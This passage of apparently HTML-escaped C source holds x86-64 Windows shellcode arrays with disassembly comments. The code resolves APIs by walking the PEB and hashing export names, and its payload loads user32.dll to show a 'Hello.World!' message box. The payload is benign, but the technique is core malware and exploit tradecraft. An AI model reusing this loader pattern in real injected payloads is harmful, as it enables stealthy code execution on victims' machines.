rax, [rax+0x18]         */\n    /* 00AC */ &quot;\\x4c\\x8b\\x50\\x30&quot;                 /* mov r10, [rax+0x30]         */\n    /* 00B0 */ &quot;\\x49\\x8b\\x6a\\x10&quot;                 /* mov rbp, [r10+0x10]         */\n    /* 00B4 */ &quot;\\x48\\x85\\xed&quot;                     /* test rbp, rbp               */\n    /* 00B7 */ &quot;\\x89\\xe8&quot;                         /* mov eax, ebp                */\n    /* 00B9 */ &quot;\\x74\\x4f&quot;                         /* jz 0x10a                    */\n    /* 00BB */ &quot;\\x4d\\x8b\\x12&quot;                     /* mov r10, [r10]              */\n    /* 00BE */ &quot;\\x8b\\x45\\x3c&quot;                     /* mov eax, [rbp+0x3c]         */\n    /* 00C1 */ &quot;\\x83\\xc0\\x10&quot;                     /* add eax, 0x10               */\n    /* 00C4 */ &quot;\\x8b\\x44\\x05\\x78&quot;                 /* mov eax, [rbp+rax+0x78]     */\n    /* 00C8 */ &quot;\\x48\\x8d\\x74\\x05\\x18&quot;             /* lea rsi, [rbp+rax+0x18]     */\n    /* 00CD */ &quot;\\xad&quot;                             /* lodsd                       */\n    /* 00CE */ &quot;\\x91&quot;                             /* xchg ecx, eax               */\n    /* 00CF */ &quot;\\x67\\xe3\\xde&quot;                     /* jecxz 0xb0                  */\n    /* 00D2 */ &quot;\\xad&quot;                             /* lodsd                       */\n    /* 00D3 */ &quot;\\x4c\\x8d\\x5c\\x05\\x00&quot;             /* lea r11, [rbp+rax]          */\n    /* 00D8 */ &quot;\\xad&quot;                             /* lodsd                       */\n    /* 00D9 */ &quot;\\x48\\x8d\\x7c\\x05\\x00&quot;             /* lea rdi, [rbp+rax]          */\n    /* 00DE */ &quot;\\xad&quot;                             /* lodsd                       */\n    /* 00DF */ &quot;\\x48\\x8d\\x5c\\x05\\x00&quot;             /* lea rbx, [rbp+rax]          */\n    /* 00E4 */ &quot;\\x8b\\x74\\x8f\\xfc&quot;                 /* mov esi, [rdi+rcx*4-0x4]    */\n    /* 00E8 */ &quot;\\x48\\x01\\xee&quot;                     /* add rsi, rbp                */\n    /* 00EB */ &quot;\\x31\\xc0&quot;                         /* xor eax, eax                */\n    /* 00ED */ &quot;\\x99&quot;                             /* cdq                         */\n    /* 00EE */ &quot;\\xac&quot;                             /* lodsb                       */\n    /* 00EF */ &quot;\\x01\\xc2&quot;                         /* add edx, eax                */\n    /* 00F1 */ &quot;\\xc1\\xc2\\x05&quot;                     /* rol edx, 0x5                */\n    /* 00F4 */ &quot;\\xff\\xc8&quot;                         /* dec eax                     */\n    /* 00F6 */ &quot;\\x79\\xf6&quot;                         /* jns 0xee                    */\n    /* 00F8 */ &quot;\\x44\\x39\\xc2&quot;                     /* cmp edx, r8d                */\n    /* 00FB */ &quot;\\xe0\\xe7&quot;                         /* loopne 0xe4                 */\n    /* 00FD */ &quot;\\x75\\xb1&quot;                         /* jnz 0xb0                    */\n    /* 00FF */ &quot;\\x0f\\xb7\\x14\\x4b&quot;                 /* movzx edx, word [rbx+rcx*2] */\n    /* 0103 */ &quot;\\x41\\x8b\\x04\\x93&quot;                 /* mov eax, [r11+rdx*4]        */\n    /* 0107 */ &quot;\\x48\\x01\\xe8&quot;                     /* add rax, rbp                */\n    /* 010A */ &quot;\\x59&quot;                             /* pop rcx                     */\n    /* 010B */ &quot;\\x5b&quot;                             /* pop rbx                     */\n    /* 010C */ &quot;\\x5f&quot;                             /* pop rdi                     */\n    /* 010D */ &quot;\\x5e&quot;                             /* pop rsi                     */\n    /* 010E */ &quot;\\xc3&quot;                             /* ret                         */\n};\n#define EXECPIC_SIZE 1984\nchar EXECPIC[] = {\n    /* 0000 */ &quot;\\x48\\x81\\xec\\xd8\\x00\\x00\\x00&quot;                     /* sub rsp, 0xd8                            */\n    /* 0007 */ &quot;\\x48\\xc7\\x44\\x24\\x78\\x00\\x00\\x00\\x00&quot;             /* mov qword [rsp+0x78], 0x0                */\n    /* 0010 */ &quot;\\x48\\xc7\\x84\\x24\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; /* mov qword [rsp+0x80], 0x0                */\n    /* 001C */ &quot;\\x48\\xc7\\x84\\x24\\xa8\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; /* mov qword [rsp+0xa8], 0x0                */\n    /* 0028 */ &quot;\\xb8\\x75\\x00\\x00\\x00&quot;                             /* mov eax, 0x75                            */\n    /* 002D */ &quot;\\x66\\x89\\x44\\x24\\x58&quot;                             /* mov [rsp+0x58], ax                       */\n    /* 0032 */ &quot;\\xb8\\x73\\x00\\x00\\x00&quot;                             /* mov eax, 0x73                            */\n    /* 0037 */ &quot;\\x66\\x89\\x44\\x24\\x5a&quot;                             /* mov [rsp+0x5a], ax                       */\n    /* 003C */ &quot;\\xb8\\x65\\x00\\x00\\x00&quot;                             /* mov eax, 0x65                            */\n    /* 0041 */ &quot;\\x66\\x89\\x44\\x24\\x5c&quot;                             /* mov [rsp+0x5c], ax                       */\n    /* 0046 */ &quot;\\xb8\\x72\\x00\\x00\\x00&quot;                             /* mov eax, 0x72                            */\n    /* 004B */ &quot;\\x66\\x89\\x44\\x24\\x5e&quot;                             /* mov [rsp+0x5e], ax                       */\n    /* 0050 */ &quot;\\xb8\\x33\\x00\\x00\\x00&quot;                             /* mov eax, 0x33                            */\n    /* 0055 */ &quot;\\x66\\x89\\x44\\x24\\x60&quot;                             /* mov [rsp+0x60], ax                       */\n    /* 005A */ &quot;\\xb8\\x32\\x00\\x00\\x00&quot;                             /* mov eax, 0x32                            */\n    /* 005F */ &quot;\\x66\\x89\\x44\\x24\\x62&quot;                             /* mov [rsp+0x62], ax                       */\n    /* 0064 */ &quot;\\xb8\\x2e\\x00\\x00\\x00&quot;                             /* mov eax, 0x2e                            */\n    /* 0069 */ &quot;\\x66\\x89\\x44\\x24\\x64&quot;                             /* mov [rsp+0x64], ax                       */\n    /* 006E */ &quot;\\xb8\\x64\\x00\\x00\\x00&quot;                             /* mov eax, 0x64                            */\n    /* 0073 */ &quot;\\x66\\x89\\x44\\x24\\x66&quot;                             /* mov [rsp+0x66], ax                       */\n    /* 0078 */ &quot;\\xb8\\x6c\\x00\\x00\\x00&quot;                             /* mov eax, 0x6c                            */\n    /* 007D */ &quot;\\x66\\x89\\x44\\x24\\x68&quot;                             /* mov [rsp+0x68], ax                       */\n    /* 0082 */ &quot;\\xb8\\x6c\\x00\\x00\\x00&quot;                             /* mov eax, 0x6c                            */\n    /* 0087 */ &quot;\\x66\\x89\\x44\\x24\\x6a&quot;                             /* mov [rsp+0x6a], ax                       */\n    /* 008C */ &quot;\\x33\\xc0&quot;                                         /* xor eax, eax                             */\n    /* 008E */ &quot;\\x66\\x89\\x44\\x24\\x6c&quot;                             /* mov [rsp+0x6c], ax                       */\n    /* 0093 */ &quot;\\xc6\\x44\\x24\\x30\\x4d&quot;                             /* mov byte [rsp+0x30], 0x4d                */\n    /* 0098 */ &quot;\\xc6\\x44\\x24\\x31\\x65&quot;                             /* mov byte [rsp+0x31], 0x65                */\n    /* 009D */ &quot;\\xc6\\x44\\x24\\x32\\x73&quot;                             /* mov byte [rsp+0x32], 0x73                */\n    /* 00A2 */ &quot;\\xc6\\x44\\x24\\x33\\x73&quot;                             /* mov byte [rsp+0x33], 0x73                */\n    /* 00A7 */ &quot;\\xc6\\x44\\x24\\x34\\x61&quot;                             /* mov byte [rsp+0x34], 0x61                */\n    /* 00AC */ &quot;\\xc6\\x44\\x24\\x35\\x67&quot;                             /* mov byte [rsp+0x35], 0x67                */\n    /* 00B1 */ &quot;\\xc6\\x44\\x24\\x36\\x65&quot;                             /* mov byte [rsp+0x36], 0x65                */\n    /* 00B6 */ &quot;\\xc6\\x44\\x24\\x37\\x42&quot;                             /* mov byte [rsp+0x37], 0x42                */\n    /* 00BB */ &quot;\\xc6\\x44\\x24\\x38\\x6f&quot;                             /* mov byte [rsp+0x38], 0x6f                */\n    /* 00C0 */ &quot;\\xc6\\x44\\x24\\x39\\x78&quot;                             /* mov byte [rsp+0x39], 0x78                */\n    /* 00C5 */ &quot;\\xc6\\x44\\x24\\x3a\\x41&quot;                             /* mov byte [rsp+0x3a], 0x41                */\n    /* 00CA */ &quot;\\xc6\\x44\\x24\\x3b\\x00&quot;                             /* mov byte [rsp+0x3b], 0x0                 */\n    /* 00CF */ &quot;\\xc6\\x44\\x24\\x40\\x48&quot;                             /* mov byte [rsp+0x40], 0x48                */\n    /* 00D4 */ &quot;\\xc6\\x44\\x24\\x41\\x65&quot;                             /* mov byte [rsp+0x41], 0x65                */\n    /* 00D9 */ &quot;\\xc6\\x44\\x24\\x42\\x6c&quot;                             /* mov byte [rsp+0x42], 0x6c                */\n    /* 00DE */ &quot;\\xc6\\x44\\x24\\x43\\x6c&quot;                             /* mov byte [rsp+0x43], 0x6c                */\n    /* 00E3 */ &quot;\\xc6\\x44\\x24\\x44\\x6f&quot;                             /* mov byte [rsp+0x44], 0x6f                */\n    /* 00E8 */ &quot;\\xc6\\x44\\x24\\x45\\x2e&quot;                             /* mov byte [rsp+0x45], 0x2e                */\n    /* 00ED */ &quot;\\xc6\\x44\\x24\\x46\\x57&quot;                             /* mov byte [rsp+0x46], 0x57                */\n    /* 00F2 */ &quot;\\xc6\\x44\\x24\\x47\\x6f&quot;                             /* mov byte [rsp+0x47], 0x6f                */\n    /* 00F7 */ &quot;\\xc6\\x44\\x24\\x48\\x6c&quot;                             /* mov byte [rsp+0x48], 0x6c                */\n    /* 00FC */ &quot;\\xc6\\x44\\x24\\x49\\x72&quot;                             /* mov byte [rsp+0x49], 0x72                */\n    /* 0101 */ &quot;\\xc6\\x44\\x24\\x4a\\x64&quot;                             /* mov byte [rsp+0x4a], 0x64                */\n    /* 0106 */ &quot;\\xc6\\x44\\x24\\x4b\\x21&quot;                             /* mov byte [rsp+0x4b], 0x21                */\n    /* 010B */ &quot;\\xc6\\x44\\x24\\x4c\\x00&quot;                             /* mov byte [rsp+0x4c], 0x0                 */\n    /* 0110 */ &quot;\\xe8\\x3b\\x05\\x00\\x00&quot;                             /* call 0x650                               */\n    /* 0115 */ &quot;\\x48\\x89\\x84\\x24\\x88\\x00\\x00\\x00&quot;                 /* mov [rsp+0x88], rax                      */\n    /* 011D */ &quot;\\x48\\x83\\xbc\\x24\\x88\\x00\\x00\\x00\\xff&quot;             /* cmp qword [rsp+0x88], 0xffffffffffffffff */\n    /* 0126 */ &quot;\\x75\\x05&quot;                                         /* jnz 0x12d                                */\n    /* 0128 */ &quot;\\xe9\\xd9\\x01\\x00\\x00&quot;                             /* jmp 0x306                                */\n    /* 012D */ &quot;\\x48\\x8b\\x84\\x24\\x88\\x00\\x00\\x00&quot;                 /* mov rax, [rsp+0x88]                      */\n    /* 0135 */ &quot;\\x48\\x89\\x44\\x24\\x28&quot;                             /* mov [rsp+0x28], rax                      */\n    /* 013A */ &quot;\\x48\\x8b\\x44\\x24\\x28&quot;                             /* mov rax, [rsp+0x28]                      */\n    /* 013F */ &quot;\\x48\\x89\\x84\\x24\\xb0\\x00\\x00\\x00&quot;                 /* mov [rsp+0xb0], rax                      */\n    /* 0147 */ &quot;\\x48\\x8b\\x84\\x24\\xb0\\x00\\x00\\x00&quot;                 /* mov rax, [rsp+0xb0]                      */\n    /* 014F */ &quot;\\x48\\x63\\x40\\x3c&quot;                                 /* movsxd rax, dword [rax+0x3c]             */\n    /* 0153 */ &quot;\\x48\\x8b\\x4c\\x24\\x28&quot;                             /* mov rcx, [rsp+0x28]                      */\n    /* 0158 */ &quot;\\x48\\x03\\xc8&quot;                                     /* add rcx, rax                             */\n    /* 015B */ &quot;\\x48\\x8b\\xc1&quot;                                     /* mov rax, rcx                             */\n    /* 015E */ &quot;\\x48\\x89\\x84\\x24\\xb8\\x00\\x00\\x00&quot;                 /* mov [rsp+0xb8], rax                      */\n    /* 0166 */ &quot;\\xb8\\x08\\x00\\x00\\x00&quot;                             /* mov eax, 0x8                             */\n    /* 016B */ &quot;\\x48\\x6b\\xc0\\x00&quot;                                 /* imul rax, rax, 0x0                       */\n    /* 016F */ &quot;\\x48\\x8b\\x8c\\x24\\xb8\\x00\\x00\\x00&quot;                 /* mov rcx, [rsp+0xb8]                      */\n    /* 0177 */ &quot;\\x8b\\x84\\x01\\x88\\x00\\x00\\x00&quot;                     /* mov eax, [rcx+rax+0x88]                  */\n    /* 017E */ &quot;\\x48\\x8b\\x4c\\x24\\x28&quot;                             /* mov rcx, [rsp+0x28]                      */\n    /* 0183 */ &quot;\\x48\\x03\\xc8&quot;                                     /* add rcx, rax                             */\n    /* 0186 */ &quot;\\x48\\x8b\\xc1&quot;                                     /* mov rax, rcx                             */\n    /* 0189 */ &quot;\\x48\\x89\\x44\\x24\\x50&quot;                             /* mov [rsp+0x50], rax                      */\n    /* 018E */ &quot;\\x48\\x8b\\x44\\x24\\x50&quot;                             /* mov rax, [rsp+0x50]                      */\n    /* 0193 */ &quot;\\x8b\\x40\\x20&quot;                                     /* mov eax, [rax+0x20]                      */\n    /* 0196 */ &quot;\\x48\\x8b\\x4c\\x24\\x28&quot;                             /* mov rcx, [rsp+0x28]                      */\n    /* 019B */ &quot;\\x48\\x03\\xc8&quot;                                     /* add rcx, rax                             */\n    /* 019E */ &quot;\\x48\\x8b\\xc1&quot;                                     /* mov rax, rcx                             */\n    /* 01A1 */ &quot;\\x48\\x89\\x84\\x24\\xc0\\x00\\x00\\x00&quot;                 /* mov [rsp+0xc0], rax                      */\n    /* 01A9 */ &quot;\\x48\\x8b\\x44\\x24\\x50&quot;                             /* mov rax, [rsp+0x50]                      */\n    /* 01AE */ &quot;\\x8b\\x40\\x1c&quot;                                     /* mov eax, [rax+0x1c]                      */\n    /* 01B1 */ &quot;\\x48\\x8b\\x4c\\x24\\x28&quot;                             /* mov rcx, [rsp+0x28]                      */\n    /* 01B6 */ &quot;\\x48\\x03\\xc8&quot;                                     /* add rcx, rax                             */\n    /* 01B9 */ &quot;\\x48\\x8b\\xc1&quot;                                     /* mov rax, rcx                             */\n    /* 01BC */ &quot;\\x48\\x89\\x84\\x24\\xa0\\x00\\x00\\x00&quot;                 /* mov [rsp+0xa0], rax                      */\n    /* 01C4 */ &quot;\\x48\\x8b\\x44\\x24\\x50&quot;                             /* mov rax, [rsp+0x50]                      */\n    /* 01C9 */ &quot;\\x8b\\x40\\x24&quot;                                     /* mov eax, [rax+0x24]                      */\n    /* 01CC */ &quot;\\x48\\x8b\\x4c\\x24\\x28&quot;                             /* mov rcx, [rsp+0x28]                      */\n    /* 01D1 */ &quot;\\x48\\x03\\xc8&quot;                                     /* add rcx, rax                             */\n    /* 01D4 */ &quot;\\x48\\x8b\\xc1&quot;                                     /* mov rax, rcx                             */\n    /* 01D7 */ &quot;\\x48\\x89\\x84\\x24\\x98\\x00\\x00\\x00&quot;                 /* mov [rsp+0x98], rax                      */\n    /* 01DF */ &quot;\\xc7\\x44\\x24\\x74\\x88\\xef\\xff\\x6f&quot;                 /* mov dword [rsp+0x74], 0x6fffef88         */\n    /* 01E7 */ &quot;\\xc7\\x44\\x24\\x70\\x7e\\xaa\\x8a\\x3f&quot;                 /* mov dword [rsp+0x70], 0x3f8aaa7e         */\n    /* 01EF */ &quot;\\xc7\\x44\\x24\\x20\\x00\\x00\\x00\\x00&quot;                 /* mov dword [rsp+0x20], 0x0                */\n    /* 01F7 */ &quot;\\xeb\\x0a&quot;                                         /* jmp 0x203                                */\n    /* 01F9 */ &quot;\\x8b\\x44\\x24\\x20&quot;                                 /* mov eax, [rsp+0x20]                      */\n    /* 01FD */ &quot;\\xff\\xc0&quot;                                         /* inc eax                                  */\n    /* 01FF */ &quot;\\x89\\x44\\x24\\x20&quot;                                 /* mov [rsp+0x20], eax                      */\n    /* 0203 */ &quot;\\x48\\x8b\\x44\\x24\\x50&quot;                             /* mov rax, [rsp+0x50]                      */\n    /* 0208 */ &quot;\\x8b\\x40\\x18&quot;                                     /* mov eax, [rax+0x18]                      */\n    /* 020B */ &quot;\\x39\\x44\\x24\\x20&quot;                                 /* cmp [rsp+0x20], eax                      */\n    /* 020F */ &quot;\\x0f\\x83\\xf1\\x00\\x00\\x00&quot;                         /* jae 0x306                                */\n    /* 0215 */ &quot;\\x8b\\x44\\x24\\x20&quot;                                 /* mov eax, [rsp+0x20]                      */\n    /* 0219 */ &quot;\\x48\\x8b\\x8c\\x24\\xc0\\x00\\x00\\x00&quot;                 /* mov rcx, [rsp+0xc0]                      */\n    /* 0221 */ &quot;\\x8b\\x04\\x81&quot;                                     /* mov eax, [rcx+rax*4]                     */\n    /* 0224 */ &quot;\\x48\\x8b\\x4c\\x24\\x28&quot;                             /* mov rcx, [rsp+0x28]                      */\n    /* 0229 */ &quot;\\x48\\x03\\xc8&quot;                                     /* add rcx, rax                             */\n    /* 022C */ &quot;\\x48\\x8b\\xc1&quot;                                     /* mov rax, rcx                             */\n    /* 022F */ &quot;\\x48\\x89\\x84\\x24\\x90\\x00\\x00\\x00&quot;                 /* mov [rsp+0x90], rax                      */\n    /* 0237 */ &quot;\\x48\\x8b\\x8c\\x24\\x90\\x00\\x00\\x00&quot;                 /* mov rcx, [rsp+0x90]                      */\n    /* 023F */ &quot;\\xe8\\xac\\x03\\x00\\x00&quot;                             /* call 0x5f0                               */\n    /* 0244 */ &quot;\\x3b\\x44\\x24\\x70&quot;                                 /* cmp eax, [rsp+0x70]                      */\n    /* 0248 */ &quot;\\x75\\x30&quot;                                         /* jnz 0x27a                                */\n    /* 024A */ &quot;\\x8b\\x44\\x24\\x20&quot;                                 /* mov eax, [rsp+0x20]                      */\n    /* 024E */ &quot;\\x48\\x8b\\x8c\\x24\\x98\\x00\\x00\\x00&quot;                 /* mov rcx, [rsp+0x98]                      */\n    /* 0256 */ &quot;\\x0f\\xb7\\x04\\x41&quot;                                 /* movzx eax, word [rcx+rax*2]              */\n    /* 025A */ &quot;\\x48\\x8b\\x8c\\x24\\xa0\\x00\\x00\\x00&quot;                 /* mov rcx, [rsp+0xa0]                      */\n    /* 0262 */ &quot;\\x8b\\x04\\x81&quot;                                     /* mov eax, [rcx+rax*4]                     */\n    /* 0265 */ &quot;\\x48\\x8b\\x4c\\x24\\x28&quot;                             /* mov rcx, [rsp+0x28]                      */\n    /* 026A */ &quot;\\x48\\x03\\xc8&quot;                                     /* add rcx, rax                             */\n    /* 026D */ &quot;\\x48\\x8b\\xc1&quot;                                     /* mov rax, rcx                             */\n    /* 0270 */ &quot;\\x48\\x89\\x84\\x24\\x80\\x00\\x00\\x00&quot;                 /* mov [rsp+0x80], rax                      */\n    /* 0278 */ &quot;\\xeb\\x3e&quot;                                         /* jmp 0x2b8                                */\n    /* 027A */ &quot;\\x48\\x8b\\x8c\\x24\\x90\\x00\\x00\\x00&quot;                 /* mov rcx, [rsp+0x90]                      */\n    /* 0282 */ &quot;\\xe8\\x69\\x03\\x00\\x00&quot;                             /* call 0x5f0                               */\n    /* 0287 */ &quot;\\x3b\\x44\\x24\\x74&quot;                                 /* cmp eax, [rsp+0x74]                      */\n    /* 028B */ &quot;\\x75\\x2b&quot;                                         /* jnz 0x2b8                                */\n    /* 028D */ &quot;\\x8b\\x44\\x24\\x20&quot;                                 /* mov eax, [rsp+0x20]                      */\n    /* 0291 */ &quot;\\x48\\x8b\\x8c\\x24\\x98\\x00\\x00\\x00&quot;                 /* mov rcx, [rsp+0x98]                      */\n    /* 0299 */ &quot;\\x0f\\xb7\\x04\\x41&quot;                                 /* movzx eax, word [rcx+rax*2]              */\n    /* 029D */ &quot;\\x48\\x8b\\x8c\\x24\\xa0\\x00\\x00\\x00&quot;                 /* mov rcx, [rsp+0xa0]                      */\n    /* 02A5 */ &quot;\\x8b\\x04\\x81&quot;                                     /* mov eax, [rcx+rax*4]                     */\n    /* 02A8 */ &quot;\\x48\\x8b\\x4c\\x24\\x28&quot;                             /* mov rcx, [rsp+0x28]                      */\n    /* 02AD */ &quot;\\x48\\x03\\xc8&quot;                                     /* add rcx, rax                             */\n    /* 02B0 */ &quot;\\x48\\x8b\\xc1&quot;                                     /* mov rax, rcx                             */\n    /* 02B3 */ &quot;\\x48\\x89\\x44\\x24\\x78&quot;                             /* mov [rsp+0x78], rax                      */\n    /* 02B8 */ &quot;\\x48\\x83\\xbc\\x24\\x80\\x00\\x00\\x00\\x00&quot;             /* cmp qword [rsp+0x80], 0x0                */\n    /* 02C1 */ &quot;\\x74\\x3e&quot;                                         /* jz 0x301                                 */\n    /* 02C3 */ &quot;\\x48\\x83\\x7c\\x24\\x78\\x00&quot;                         /* cmp qword [rsp+0x78], 0x0                */\n    /* 02C9 */ &quot;\\x74\\x36&quot;                                         /* jz 0x301                                 */\n    /* 02CB */ &quot;\\x48\\x8d\\x4c\\x24\\x58&quot;                             /* lea rcx, [rsp+0x58]                      */\n    /* 02D0 */ &quot;\\xff\\x54\\x24\\x78&quot;                                 /* call qword [rsp+0x78]                    */\n    /* 02D4 */ &quot;\\x48\\x8d\\x54\\x24\\x30&quot;                             /* lea rdx, [rsp+0x30]                      */\n    /* 02D9 */ &quot;\\x48\\x8b\\xc8&quot;                                     /* mov rcx, rax                             */\n    /* 02DC */ &quot;\\xff\\x94\\x24\\x80\\x00\\x00\\x00&quot;                     /* call qword [rsp+0x80]                    */\n    /* 02E3 */ &quot;\\x48\\x89\\x84\\x24\\xa8\\x00\\x00\\x00&quot;                 /* mov [rsp+0xa8], rax                      */\n    /* 02EB */ &quot;\\x45\\x33\\xc9&quot;                                     /* xor r9d, r9d                             */\n    /* 02EE */ &quot;\\x45\\x33\\xc0&quot;                                     /* xor r8d, r8d                             */\n    /* 02F1 */ &quot;\\x48\\x8d\\x54\\x24\\x40&quot;                             /* lea rdx, [rsp+0x40]                      */\n    /* 02F6 */ &quot;\\x33\\xc9&quot;                                         /* xor ecx, ecx                             */\n    /* 02F8 */ &quot;\\xff\\x94\\x24\\xa8\\x00\\x00\\x00&quot;                     /* call qword [rsp+0xa8]                    */\n    /* 02FF */ &quot;\\xeb\\x05&quot;                                         /* jmp 0x306                                */\n    /* 0301 */ &quot;\\xe9\\xf3\\xfe\\xff\\xff&quot;                             /* jmp 0x1f9                                */\n    /* 0306 */ &quot;\\x48\\x81\\xc4\\xd8\\x00\\x00\\x00&quot;                     /* add rsp, 0xd8                            */\n    /* 030D */ &quot;\\xc3&quot;                                             /* ret                                      */\n    /* 030E */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 030F */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 0310 */ &quot;\\x88\\x4c\\x24\\x08&quot;                                 /* mov [rsp+0x8], cl                        */\n    /* 0314 */ &quot;\\x48\\x83\\xec\\x18&quot;                                 /* sub rsp, 0x18                            */\n    /* 0318 */ &quot;\\x0f\\xbe\\x44\\x24\\x20&quot;                             /* movsx eax, byte [rsp+0x20]               */\n    /* 031D */ &quot;\\x83\\xf8\\x41&quot;                                     /* cmp eax, 0x41                            */\n    /* 0320 */ &quot;\\x7c\\x13&quot;                                         /* jl 0x335                                 */\n    /* 0322 */ &quot;\\x0f\\xbe\\x44\\x24\\x20&quot;                             /* movsx eax, byte [rsp+0x20]               */\n    /* 0327 */ &quot;\\x83\\xf8\\x5a&quot;                                     /* cmp eax, 0x5a                            */\n    /* 032A */ &quot;\\x7f\\x09&quot;                                         /* jg 0x335                                 */\n    /* 032C */ &quot;\\xc7\\x04\\x24\\x01\\x00\\x00\\x00&quot;                     /* mov dword [rsp], 0x1                     */\n    /* 0333 */ &quot;\\xeb\\x07&quot;                                         /* jmp 0x33c                                */\n    /* 0335 */ &quot;\\xc7\\x04\\x24\\x00\\x00\\x00\\x00&quot;                     /* mov dword [rsp], 0x0                     */\n    /* 033C */ &quot;\\x8b\\x04\\x24&quot;                                     /* mov eax, [rsp]                           */\n    /* 033F */ &quot;\\x48\\x83\\xc4\\x18&quot;                                 /* add rsp, 0x18                            */\n    /* 0343 */ &quot;\\xc3&quot;                                             /* ret                                      */\n    /* 0344 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 0345 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 0346 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 0347 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 0348 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 0349 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 034A */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 034B */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 034C */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 034D */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 034E */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 034F */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 0350 */ &quot;\\x88\\x4c\\x24\\x08&quot;                                 /* mov [rsp+0x8], cl                        */\n    /* 0354 */ &quot;\\x48\\x83\\xec\\x38&quot;                                 /* sub rsp, 0x38                            */\n    /* 0358 */ &quot;\\x0f\\xb6\\x4c\\x24\\x40&quot;                             /* movzx ecx, byte [rsp+0x40]               */\n    /* 035D */ &quot;\\xe8\\xae\\xff\\xff\\xff&quot;                             /* call 0x310                               */\n    /* 0362 */ &quot;\\x85\\xc0&quot;                                         /* test eax, eax                            */\n    /* 0364 */ &quot;\\x74\\x0e&quot;                                         /* jz 0x374                                 */\n    /* 0366 */ &quot;\\x0f\\xbe\\x44\\x24\\x40&quot;                             /* movsx eax, byte [rsp+0x40]               */\n    /* 036B */ &quot;\\x83\\xc0\\x20&quot;                                     /* add eax, 0x20                            */\n    /* 036E */ &quot;\\x89\\x44\\x24\\x20&quot;                                 /* mov [rsp+0x20], eax                      */\n    /* 0372 */ &quot;\\xeb\\x09&quot;                                         /* jmp 0x37d                                */\n    /* 0374 */ &quot;\\x0f\\xbe\\x44\\x24\\x40&quot;                             /* movsx eax, byte [rsp+0x40]               */\n    /* 0379 */ &quot;\\x89\\x44\\x24\\x20&quot;                                 /* mov [rsp+0x20], eax                      */\n    /* 037D */ &quot;\\x0f\\xb6\\x44\\x24\\x20&quot;                             /* movzx eax, byte [rsp+0x20]               */\n    /* 0382 */ &quot;\\x48\\x83\\xc4\\x38&quot;                                 /* add rsp, 0x38                            */\n    /* 0386 */ &quot;\\xc3&quot;                                             /* ret                                      */\n    /* 0387 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 0388 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 0389 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 038A */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 038B */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 038C */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 038D */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 038E */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 038F */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 0390 */ &quot;\\x48\\x89\\x4c\\x24\\x08&quot;                             /* mov [rsp+0x8], rcx                       */\n    /* 0395 */ &quot;\\x48\\x83\\xec\\x18&quot;                                 /* sub rsp, 0x18                            */\n    /* 0399 */ &quot;\\xc7\\x04\\x24\\x00\\x00\\x00\\x00&quot;                     /* mov dword [rsp], 0x0                     */\n    /* 03A0 */ &quot;\\x8b\\x04\\x24&quot;                                     /* mov eax, [rsp]                           */\n    /* 03A3 */ &quot;\\x48\\x8b\\x4c\\x24\\x20&quot;                             /* mov rcx, [rsp+0x20]                      */\n    /* 03A8 */ &quot;\\x0f\\xb7\\x04\\x41&quot;                                 /* movzx eax, word [rcx+rax*2]              */\n    /* 03AC */ &quot;\\x85\\xc0&quot;                                         /* test eax, eax                            */\n    /* 03AE */ &quot;\\x74\\x0a&quot;                                         /* jz 0x3ba                                 */\n    /* 03B0 */ &quot;\\x8b\\x04\\x24&quot;                                     /* mov eax, [rsp]                           */\n    /* 03B3 */ &quot;\\xff\\xc0&quot;                                         /* inc eax                                  */\n    /* 03B5 */ &quot;\\x89\\x04\\x24&quot;                                     /* mov [rsp], eax                           */\n    /* 03B8 */ &quot;\\xeb\\xe6&quot;                                         /* jmp 0x3a0                                */\n    /* 03BA */ &quot;\\x8b\\x04\\x24&quot;                                     /* mov eax, [rsp]                           */\n    /* 03BD */ &quot;\\x48\\x83\\xc4\\x18&quot;                                 /* add rsp, 0x18                            */\n    /* 03C1 */ &quot;\\xc3&quot;                                             /* ret                                      */\n    /* 03C2 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 03C3 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 03C4 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 03C5 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 03C6 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 03C7 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 03C8 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 03C9 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 03CA */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 03CB */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 03CC */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 03CD */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 03CE */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 03CF */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 03D0 */ &quot;\\x48\\x89\\x54\\x24\\x10&quot;                             /* mov [rsp+0x10], rdx                      */\n    /* 03D5 */ &quot;\\x48\\x89\\x4c\\x24\\x08&quot;                             /* mov [rsp+0x8], rcx                       */\n    /* 03DA */ 